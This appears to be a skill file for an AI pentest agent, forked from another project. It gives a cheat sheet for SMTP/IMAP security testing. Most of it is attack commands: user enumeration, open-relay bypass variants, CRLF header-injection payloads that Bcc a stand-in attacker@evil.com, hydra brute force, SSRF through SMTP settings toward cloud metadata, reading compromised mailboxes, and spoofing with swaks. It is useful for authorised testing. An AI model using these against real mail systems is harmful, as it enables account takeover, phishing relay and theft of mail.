<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: smtp-imap
description: SMTP and IMAP security testing covering open relay, email header injection, user enumeration, credential brute force, and SMTP as SSRF pivot
---

# SMTP / IMAP Security Testing

Email protocols are often overlooked but are critical attack surface in pentests. Attack surface: open relay (spam pivot), SMTP user enumeration, email header injection (phishing pivot), credential brute force, and SMTP as SSRF vector.

---

## Reconnaissance

### Discovery

    # Port scanning for email services
    nmap -p 25,465,587,110,143,993,995 <target> -sV --open

    # Ports:
    # 25   — SMTP (submission/relay)
    # 465  — SMTPS (SMTP over TLS — legacy)
    # 587  — Submission (authenticated SMTP)
    # 110  — POP3
    # 143  — IMAP
    # 993  — IMAPS (IMAP over TLS)
    # 995  — POP3S (POP3 over TLS)

### Banner Grabbing

    nc <target> 25
    EHLO test.com
    # Server responds with capabilities: AUTH, STARTTLS, SIZE, etc.

    # Capture banner
    nmap -p 25 <target> --script smtp-commands,smtp-open-relay,smtp-ntlm-info

---

## SMTP User Enumeration

Three methods: VRFY, EXPN, RCPT TO (most common):

### VRFY Method

    # VRFY verifies if a user exists
    nc <target> 25
    EHLO attacker.com
    VRFY root               # "252 2.0.0 root" = valid | "550 5.1.1" = invalid
    VRFY admin
    VRFY postmaster

### EXPN Method

    # EXPN expands a mailing list (often more verbose)
    nc <target> 25
    EHLO attacker.com
    EXPN admin              # "250 admin@domain.com" = valid
    EXPN mailing-list       # Lists all members

### RCPT TO Method (Most Common — Works When VRFY/EXPN Disabled)

    # Send an email to each username — different responses for valid vs invalid
    nc <target> 25
    EHLO attacker.com
    MAIL FROM: <test@attacker.com>
    RCPT TO: <admin@target.com>    # "250 OK" = valid | "550 User unknown" = invalid
    RCPT TO: <root@target.com>

### Automated Enumeration

    # smtp-user-enum
    smtp-user-enum -M VRFY -U /usr/share/wordlists/usernames.txt -t <target>
    smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <target> -D target.com

    # nmap script
    nmap --script smtp-enum-users <target> -p 25

    # Metasploit
    use auxiliary/scanner/smtp/smtp_enum

---

## Open Relay Testing

Open relay = SMTP server relays email from any source to any destination (spam abuse, phishing pivot):

    # Manual test: attempt to relay email through target
    nc <target> 25
    EHLO test.com
    MAIL FROM: <attacker@evil.com>
    RCPT TO: <victim@gmail.com>       # External domain — should be rejected
    DATA
    From: attacker@evil.com
    To: victim@gmail.com
    Subject: Relay Test
    This is a test.
    .
    QUIT

    # If "250 OK" after RCPT TO and DATA → open relay confirmed

    # nmap automatic check
    nmap --script smtp-open-relay <target> -p 25

    # Test all relay bypass techniques:
    RCPT TO: <victim@gmail.com>
    RCPT TO: <@target.com:victim@gmail.com>      # Old source routing
    RCPT TO: <victim%gmail.com@target.com>       # Percent-encoded
    RCPT TO: <"victim@gmail.com">                # Quoted
    RCPT TO: <victim@gmail.com@target.com>       # Double domain

---

## Email Header Injection

When user input (name, email, subject) is included directly in email headers:

    # Vulnerable: name field used directly in From: header
    # Inject CRLF + new headers:

    # Basic injection (name field):
    "attacker\r\nBcc: victim@target.com"
    "attacker\nCC: victim2@target.com"

    # Complete additional message injection:
    "attacker\r\nCc: victim@target.com\r\nBcc: external@attacker.com"

    # Subject line injection:
    "Normal Subject\r\nTo: victim@evil.com"

    # Test all input fields in contact forms, registration emails, password reset:
    name: "Test\r\nBcc: attacker@evil.com"
    email: "user@example.com\r\nBcc: attacker@evil.com"

---

## SMTP Authentication Brute Force

    # Using hydra
    hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt smtp://<target> -V -s 587
    hydra -L users.txt -P passwords.txt smtp://<target>:587 -S   # SSL

    # Medusa
    medusa -h <target> -u admin@target.com -P /usr/share/wordlists/rockyou.txt -M smtp -n 587

    # nmap brute
    nmap --script smtp-brute -p 25 <target>

---

## IMAP Enumeration and Brute Force

    # Manual IMAP connection
    nc <target> 143
    a001 CAPABILITY                    # List capabilities
    a002 LOGIN user@domain.com pass    # Authenticate

    # With IMAPS (TLS):
    openssl s_client -connect <target>:993 -quiet
    a001 CAPABILITY
    a002 LOGIN user@domain.com pass

    # After auth — list and read mailboxes:
    a003 LIST "" "*"                   # List all folders
    a004 SELECT INBOX                  # Select inbox
    a005 FETCH 1:* (ENVELOPE)         # List all messages
    a006 FETCH 1 BODY[]               # Read first message (full)
    a007 FETCH 1 BODY[HEADER]         # Headers only

    # Brute force IMAP:
    hydra -l user@domain.com -P /usr/share/wordlists/rockyou.txt imap://<target>
    hydra -L users.txt -P pass.txt imaps://<target>

---

## SMTP as SSRF Vector

When a web app allows configuring SMTP server or sending emails, use it as SSRF:

    # Test internal SMTP (if web app has "email settings" configuration):
    SMTP Host: 169.254.169.254    # AWS IMDS
    SMTP Host: localhost
    SMTP Host: 127.0.0.1:22      # Port probe
    SMTP Host: 127.0.0.1:6379    # Redis probe

    # SMTP for port scanning internal network:
    SMTP Host: 10.0.0.1   Port: 22   → connection refused vs timeout = port state

---

## STARTTLS Strip / Downgrade

    # Test if STARTTLS is enforced or can be stripped:
    nc <target> 587
    EHLO test.com
    # If server lists STARTTLS but allows plaintext auth:
    AUTH PLAIN <base64(user:pass)>    # Without STARTTLS — plaintext credential exposure

    # nmap check:
    nmap --script smtp-starttls-helo <target> -p 587

---

## SMTP Information Disclosure

    # NTLM information disclosure via AUTH NTLM:
    nc <target> 25
    EHLO test.com
    AUTH NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
    # Server responds with NTLM challenge revealing: domain name, server name, OS version

    # nmap script:
    nmap --script smtp-ntlm-info <target> -p 25,587

---

## SPF / DKIM / DMARC Analysis

    # DNS records — check email authentication policy
    dig TXT <target.com> | grep -i spf
    dig TXT _dmarc.<target.com>
    dig TXT default._domainkey.<target.com>   # DKIM

    # Missing/weak SPF:
    # "v=spf1 +all" = anyone can send as domain (critical)
    # "v=spf1 ... ~all" = softfail (spoofing possible in some cases)
    # No SPF record = no protection

    # No DMARC = no enforcement even with SPF/DKIM
    # DMARC p=none = monitoring only (spoofing emails still deliver)

    # Test spoofing possibility:
    # Use swaks or sendemail to test if spoofed email is delivered
    swaks --to victim@target.com --from ceo@target.com \
      --server mail.<target.com> --body "Spoofed email test"

---

## Key Tools

    smtp-user-enum      # VRFY/EXPN/RCPT user enumeration
    swaks               # Swiss Army Knife for SMTP testing
    hydra               # Auth brute force
    nmap smtp-*         # Relay, enum, NTLM, open-relay scripts
    mxtoolbox.com       # Online SPF/DKIM/DMARC analysis

---

## Pro Tips

1. RCPT TO enumeration works even when VRFY and EXPN are disabled — always try it
2. Open relay allows sending spoofed emails through victim's mail server — instant phishing pivot
3. Header injection in contact forms is common and enables SPAM/phishing from trusted domain
4. SMTP NTLM disclosure (AUTH NTLM) reveals internal domain name + server info without credentials
5. DMARC `p=none` = no rejection of spoofed emails — domain is spoofable for phishing
6. After compromising SMTP credentials, read IMAP mailbox for plaintext credentials in old emails
7. SPF `+all` (pass all) is a critical misconfiguration — any server can send as the domain

## Summary

SMTP/IMAP testing = open relay check + user enumeration (RCPT TO) + header injection + brute force credentials. Open relay is the most impactful finding — it enables sending phishing emails from the victim's mail server. Header injection in web forms is the most common finding. Always check SPF/DKIM/DMARC for domain spoofing assessment.
